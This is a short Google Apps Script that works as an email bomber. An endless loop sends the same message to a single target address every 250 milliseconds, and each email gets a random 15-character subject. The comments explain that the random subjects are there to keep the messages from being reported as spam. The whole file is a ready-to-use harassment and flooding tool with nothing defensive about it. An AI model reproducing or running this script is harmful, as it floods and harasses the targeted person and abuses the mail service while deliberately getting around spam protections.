// This may not work if you are not in a school/company. ie. the same @company.org
// This function will create a random 15 charater string that will be the be the subject of the email. If you don't have this the others will be reported as spam.
function randomStr(m) { 
    var m = m || 15; s = '', r = 'ABCDEFGHIJKLMNOPQRSTUVWXYZabcdefghijklmnopqrstuvwxyz0123456789';
    for (var i=0; i < m; i++) { s += r.charAt(Math.floor(Math.random()*r.length)); }
    return s;
};
var message = "this will get sent to them";
var count = 0;

function myFunction() {// This function will send the emails to the person.
  while(true){
  GmailApp.sendEmail('place their email here. person@company.org', randomStr(), message);
  count++;
  console.log(count);
  Utilities.sleep(250)
  }
}
